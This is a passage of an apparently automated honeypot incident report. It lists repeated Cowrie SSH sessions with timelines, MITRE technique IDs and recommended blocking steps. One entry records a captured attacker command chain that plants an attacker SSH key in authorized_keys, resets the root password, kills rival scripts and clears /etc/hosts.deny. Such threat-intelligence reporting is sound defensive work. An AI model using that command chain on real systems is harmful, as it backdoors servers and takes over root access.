| `2026-07-21 04:00:03` | `cowrie.login.success` |
| `2026-07-21 04:00:04` | `cowrie.session.params` |
| `2026-07-21 04:00:04` | `cowrie.command.input` |
| `2026-07-21 04:00:04` | `cowrie.log.closed` |
| `2026-07-21 04:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85366e4b192a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:00 |
| **Last Seen** | 2026-07-21 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:00:07` | `cowrie.session.connect` |
| `2026-07-21 04:00:07` | `cowrie.client.version` |
| `2026-07-21 04:00:07` | `cowrie.client.kex` |
| `2026-07-21 04:00:08` | `cowrie.login.success` |
| `2026-07-21 04:00:09` | `cowrie.session.params` |
| `2026-07-21 04:00:09` | `cowrie.command.input` |
| `2026-07-21 04:00:09` | `cowrie.log.closed` |
| `2026-07-21 04:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1355a5000784

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:00 |
| **Last Seen** | 2026-07-21 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:00:12` | `cowrie.session.connect` |
| `2026-07-21 04:00:12` | `cowrie.client.version` |
| `2026-07-21 04:00:12` | `cowrie.client.kex` |
| `2026-07-21 04:00:13` | `cowrie.login.success` |
| `2026-07-21 04:00:14` | `cowrie.session.params` |
| `2026-07-21 04:00:14` | `cowrie.command.input` |
| `2026-07-21 04:00:14` | `cowrie.log.closed` |
| `2026-07-21 04:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6697bf25025b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:00 |
| **Last Seen** | 2026-07-21 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:00:18` | `cowrie.session.connect` |
| `2026-07-21 04:00:18` | `cowrie.client.version` |
| `2026-07-21 04:00:18` | `cowrie.client.kex` |
| `2026-07-21 04:00:18` | `cowrie.login.success` |
| `2026-07-21 04:00:19` | `cowrie.session.params` |
| `2026-07-21 04:00:19` | `cowrie.command.input` |
| `2026-07-21 04:00:19` | `cowrie.log.closed` |
| `2026-07-21 04:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-073240048e5e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:00 |
| **Last Seen** | 2026-07-21 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:00:23` | `cowrie.session.connect` |
| `2026-07-21 04:00:23` | `cowrie.client.version` |
| `2026-07-21 04:00:23` | `cowrie.client.kex` |
| `2026-07-21 04:00:23` | `cowrie.login.success` |
| `2026-07-21 04:00:24` | `cowrie.session.params` |
| `2026-07-21 04:00:24` | `cowrie.command.input` |
| `2026-07-21 04:00:24` | `cowrie.log.closed` |
| `2026-07-21 04:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90f8601c5cfe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:00 |
| **Last Seen** | 2026-07-21 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:00:27` | `cowrie.session.connect` |
| `2026-07-21 04:00:27` | `cowrie.client.version` |
| `2026-07-21 04:00:28` | `cowrie.client.kex` |
| `2026-07-21 04:00:28` | `cowrie.login.success` |
| `2026-07-21 04:00:29` | `cowrie.session.params` |
| `2026-07-21 04:00:29` | `cowrie.command.input` |
| `2026-07-21 04:00:29` | `cowrie.log.closed` |
| `2026-07-21 04:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-475339de6a3d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:00 |
| **Last Seen** | 2026-07-21 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:00:32` | `cowrie.session.connect` |
| `2026-07-21 04:00:32` | `cowrie.client.version` |
| `2026-07-21 04:00:33` | `cowrie.client.kex` |
| `2026-07-21 04:00:33` | `cowrie.login.success` |
| `2026-07-21 04:00:34` | `cowrie.session.params` |
| `2026-07-21 04:00:34` | `cowrie.command.input` |
| `2026-07-21 04:00:34` | `cowrie.log.closed` |
| `2026-07-21 04:00:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66cfa5ea4c55

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:00 |
| **Last Seen** | 2026-07-21 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:00:37` | `cowrie.session.connect` |
| `2026-07-21 04:00:37` | `cowrie.client.version` |
| `2026-07-21 04:00:37` | `cowrie.client.kex` |
| `2026-07-21 04:00:38` | `cowrie.login.success` |
| `2026-07-21 04:00:39` | `cowrie.session.params` |
| `2026-07-21 04:00:39` | `cowrie.command.input` |
| `2026-07-21 04:00:39` | `cowrie.log.closed` |
| `2026-07-21 04:00:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-873e1601bf45

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:00 |
| **Last Seen** | 2026-07-21 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:00:42` | `cowrie.session.connect` |
| `2026-07-21 04:00:42` | `cowrie.client.version` |
| `2026-07-21 04:00:42` | `cowrie.client.kex` |
| `2026-07-21 04:00:43` | `cowrie.login.success` |
| `2026-07-21 04:00:44` | `cowrie.session.params` |
| `2026-07-21 04:00:44` | `cowrie.command.input` |
| `2026-07-21 04:00:44` | `cowrie.log.closed` |
| `2026-07-21 04:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d94cc0808433

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:00 |
| **Last Seen** | 2026-07-21 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:00:47` | `cowrie.session.connect` |
| `2026-07-21 04:00:47` | `cowrie.client.version` |
| `2026-07-21 04:00:47` | `cowrie.client.kex` |
| `2026-07-21 04:00:48` | `cowrie.login.success` |
| `2026-07-21 04:00:49` | `cowrie.session.params` |
| `2026-07-21 04:00:49` | `cowrie.command.input` |
| `2026-07-21 04:00:49` | `cowrie.log.closed` |
| `2026-07-21 04:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aff00f1524d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:00 |
| **Last Seen** | 2026-07-21 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:00:52` | `cowrie.session.connect` |
| `2026-07-21 04:00:52` | `cowrie.client.version` |
| `2026-07-21 04:00:52` | `cowrie.client.kex` |
| `2026-07-21 04:00:53` | `cowrie.login.success` |
| `2026-07-21 04:00:53` | `cowrie.session.params` |
| `2026-07-21 04:00:53` | `cowrie.command.input` |
| `2026-07-21 04:00:54` | `cowrie.log.closed` |
| `2026-07-21 04:00:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a4dd53154e4

| Field | Detail |
|---|---|
| **Source IP** | `116.48.143[.]166` |
| **First Seen** | 2026-07-21 04:00 |
| **Last Seen** | 2026-07-21 04:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:00:53` | `cowrie.session.connect` |
| `2026-07-21 04:00:54` | `cowrie.client.version` |
| `2026-07-21 04:00:54` | `cowrie.client.kex` |
| `2026-07-21 04:00:56` | `cowrie.login.success` |
| `2026-07-21 04:00:57` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.143[.]166` to AbuseIPDB if not already reported
- [ ] Block `116.48.143[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3c6793636f2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:00 |
| **Last Seen** | 2026-07-21 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:00:57` | `cowrie.session.connect` |
| `2026-07-21 04:00:57` | `cowrie.client.version` |
| `2026-07-21 04:00:57` | `cowrie.client.kex` |
| `2026-07-21 04:00:58` | `cowrie.login.success` |
| `2026-07-21 04:00:58` | `cowrie.session.params` |
| `2026-07-21 04:00:58` | `cowrie.command.input` |
| `2026-07-21 04:00:58` | `cowrie.log.closed` |
| `2026-07-21 04:00:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44f7be1291e9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:01 |
| **Last Seen** | 2026-07-21 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:01:02` | `cowrie.session.connect` |
| `2026-07-21 04:01:02` | `cowrie.client.version` |
| `2026-07-21 04:01:02` | `cowrie.client.kex` |
| `2026-07-21 04:01:03` | `cowrie.login.success` |
| `2026-07-21 04:01:03` | `cowrie.session.params` |
| `2026-07-21 04:01:03` | `cowrie.command.input` |
| `2026-07-21 04:01:03` | `cowrie.log.closed` |
| `2026-07-21 04:01:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf2b25782f92

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:01 |
| **Last Seen** | 2026-07-21 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:01:07` | `cowrie.session.connect` |
| `2026-07-21 04:01:07` | `cowrie.client.version` |
| `2026-07-21 04:01:07` | `cowrie.client.kex` |
| `2026-07-21 04:01:07` | `cowrie.login.success` |
| `2026-07-21 04:01:08` | `cowrie.session.params` |
| `2026-07-21 04:01:08` | `cowrie.command.input` |
| `2026-07-21 04:01:08` | `cowrie.log.closed` |
| `2026-07-21 04:01:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-630ae02b48ac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:01 |
| **Last Seen** | 2026-07-21 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:01:12` | `cowrie.session.connect` |
| `2026-07-21 04:01:12` | `cowrie.client.version` |
| `2026-07-21 04:01:12` | `cowrie.client.kex` |
| `2026-07-21 04:01:12` | `cowrie.login.success` |
| `2026-07-21 04:01:13` | `cowrie.session.params` |
| `2026-07-21 04:01:13` | `cowrie.command.input` |
| `2026-07-21 04:01:13` | `cowrie.log.closed` |
| `2026-07-21 04:01:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54ecffa4ab50

| Field | Detail |
|---|---|
| **Source IP** | `185.40.30[.]168` |
| **First Seen** | 2026-07-21 04:01 |
| **Last Seen** | 2026-07-21 04:06 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:yrqf2mcBtVA0"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:01:14` | `cowrie.session.connect` |
| `2026-07-21 04:01:14` | `cowrie.client.version` |
| `2026-07-21 04:01:14` | `cowrie.client.kex` |
| `2026-07-21 04:01:15` | `cowrie.login.success` |
| `2026-07-21 04:01:16` | `cowrie.session.params` |
| `2026-07-21 04:01:16` | `cowrie.command.input` |
| `2026-07-21 04:01:16` | `cowrie.command.failed` |
| `2026-07-21 04:01:16` | `cowrie.log.closed` |
| `2026-07-21 04:01:17` | `cowrie.session.params` |
| `2026-07-21 04:01:17` | `cowrie.command.input` |
| `2026-07-21 04:01:17` | `cowrie.session.file_download` |
| `2026-07-21 04:01:17` | `cowrie.log.closed` |
| `2026-07-21 04:01:46` | `cowrie.session.params` |
| `2026-07-21 04:01:46` | `cowrie.command.input` |
| `2026-07-21 04:01:46` | `cowrie.log.closed` |
| `2026-07-21 04:01:47` | `cowrie.session.params` |
| `2026-07-21 04:01:47` | `cowrie.command.input` |
| `2026-07-21 04:01:48` | `cowrie.log.closed` |
| `2026-07-21 04:01:48` | `cowrie.session.params` |
| `2026-07-21 04:01:48` | `cowrie.command.input` |
| `2026-07-21 04:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.40.30[.]168` to AbuseIPDB if not already reported
- [ ] Block `185.40.30[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31d28b1fcf4f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:01 |
| **Last Seen** | 2026-07-21 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:01:17` | `cowrie.session.connect` |
| `2026-07-21 04:01:17` | `cowrie.client.version` |
| `2026-07-21 04:01:17` | `cowrie.client.kex` |
| `2026-07-21 04:01:17` | `cowrie.login.success` |
| `2026-07-21 04:01:19` | `cowrie.session.params` |
| `2026-07-21 04:01:19` | `cowrie.command.input` |
| `2026-07-21 04:01:19` | `cowrie.log.closed` |
| `2026-07-21 04:01:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46a528e2413a

| Field | Detail |
|---|---|
| **Source IP** | `65.49.1[.]172` |
| **First Seen** | 2026-07-21 04:01 |
| **Last Seen** | 2026-07-21 04:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:01:17` | `cowrie.session.connect` |
| `2026-07-21 04:01:17` | `cowrie.login.success` |
| `2026-07-21 04:01:18` | `cowrie.session.params` |
| `2026-07-21 04:01:18` | `cowrie.command.input` |
| `2026-07-21 04:01:18` | `cowrie.command.input` |
| `2026-07-21 04:01:18` | `cowrie.command.failed` |
| `2026-07-21 04:01:18` | `cowrie.command.input` |
| `2026-07-21 04:01:18` | `cowrie.command.failed` |
| `2026-07-21 04:01:18` | `cowrie.command.input` |
| `2026-07-21 04:01:18` | `cowrie.log.closed` |
| `2026-07-21 04:01:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.49.1[.]172` to AbuseIPDB if not already reported
- [ ] Block `65.49.1[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbab836cffea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:01 |
| **Last Seen** | 2026-07-21 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:01:21` | `cowrie.session.connect` |
| `2026-07-21 04:01:21` | `cowrie.client.version` |
| `2026-07-21 04:01:22` | `cowrie.client.kex` |
| `2026-07-21 04:01:22` | `cowrie.login.success` |
| `2026-07-21 04:01:23` | `cowrie.session.params` |
| `2026-07-21 04:01:23` | `cowrie.command.input` |
| `2026-07-21 04:01:23` | `cowrie.log.closed` |
| `2026-07-21 04:01:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5e41cf202a0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:01 |
| **Last Seen** | 2026-07-21 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:01:26` | `cowrie.session.connect` |
| `2026-07-21 04:01:26` | `cowrie.client.version` |
| `2026-07-21 04:01:26` | `cowrie.client.kex` |
| `2026-07-21 04:01:27` | `cowrie.login.success` |
| `2026-07-21 04:01:28` | `cowrie.session.params` |
| `2026-07-21 04:01:28` | `cowrie.command.input` |
| `2026-07-21 04:01:28` | `cowrie.log.closed` |
| `2026-07-21 04:01:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c66298e188a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:01 |
| **Last Seen** | 2026-07-21 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:01:31` | `cowrie.session.connect` |
| `2026-07-21 04:01:31` | `cowrie.client.version` |
| `2026-07-21 04:01:31` | `cowrie.client.kex` |
| `2026-07-21 04:01:32` | `cowrie.login.success` |
| `2026-07-21 04:01:33` | `cowrie.session.params` |
| `2026-07-21 04:01:33` | `cowrie.command.input` |
| `2026-07-21 04:01:33` | `cowrie.log.closed` |
| `2026-07-21 04:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89b0d3f5082a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:01 |
| **Last Seen** | 2026-07-21 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:01:36` | `cowrie.session.connect` |
| `2026-07-21 04:01:36` | `cowrie.client.version` |
| `2026-07-21 04:01:36` | `cowrie.client.kex` |
| `2026-07-21 04:01:37` | `cowrie.login.success` |
| `2026-07-21 04:01:37` | `cowrie.session.params` |
| `2026-07-21 04:01:37` | `cowrie.command.input` |
| `2026-07-21 04:01:37` | `cowrie.log.closed` |
| `2026-07-21 04:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1af1a33d6481

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:01 |
| **Last Seen** | 2026-07-21 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:01:41` | `cowrie.session.connect` |
| `2026-07-21 04:01:41` | `cowrie.client.version` |
| `2026-07-21 04:01:41` | `cowrie.client.kex` |
| `2026-07-21 04:01:41` | `cowrie.login.success` |
| `2026-07-21 04:01:42` | `cowrie.session.params` |
| `2026-07-21 04:01:42` | `cowrie.command.input` |
| `2026-07-21 04:01:42` | `cowrie.log.closed` |
| `2026-07-21 04:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-949bf1d58986

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
